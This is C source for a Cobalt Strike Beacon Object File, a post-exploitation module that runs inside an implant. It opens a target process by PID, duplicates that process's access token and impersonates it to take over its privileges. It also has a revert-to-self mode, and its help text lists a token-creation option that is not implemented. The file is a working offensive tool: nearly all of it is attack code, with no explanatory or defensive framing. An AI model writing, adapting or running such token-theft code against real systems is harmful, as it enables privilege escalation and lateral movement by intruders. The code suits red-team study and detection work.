#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$RevertToSelf();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    DWORD pid = BeaconDataInt(&parser);
    
    if (mode == 0) {
        // List tokens
        BeaconPrintf(CALLBACK_OUTPUT, "=== Available Token Operations ===");
        BeaconPrintf(CALLBACK_OUTPUT, "  steal <pid>    - Steal token from process");
        BeaconPrintf(CALLBACK_OUTPUT, "  make <user>    - Create token for user");
        BeaconPrintf(CALLBACK_OUTPUT, "  impersonate    - Impersonate current token");
        BeaconPrintf(CALLBACK_OUTPUT, "  revert         - Revert to self");
    }
    else if (mode == 1) {
        // Steal token from PID
        if (pid == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] PID required");
            return;
        }
        
        HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProcess) {
            BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess failed for PID %d: %d", pid, GetLastError());
            return;
        }
        
        HANDLE hToken;
        if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken failed: %d", GetLastError());
            KERNEL32$CloseHandle(hProcess);
            return;
        }
        
        HANDLE hDupToken;
        if (ADVAPI32$DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
            if (ADVAPI32$ImpersonateLoggedOnUser(hDupToken)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Token stolen from PID %d and impersonated", pid);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateLoggedOnUser failed: %d", GetLastError());
            }
            KERNEL32$CloseHandle(hDupToken);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx failed: %d", GetLastError());
        }
        
        KERNEL32$CloseHandle(hToken);
        KERNEL32$CloseHandle(hProcess);
    }
    else if (mode == 2) {
        // Revert to self
        if (ADVAPI32$RevertToSelf()) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Reverted to self");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] RevertToSelf failed");
        }
    }
}
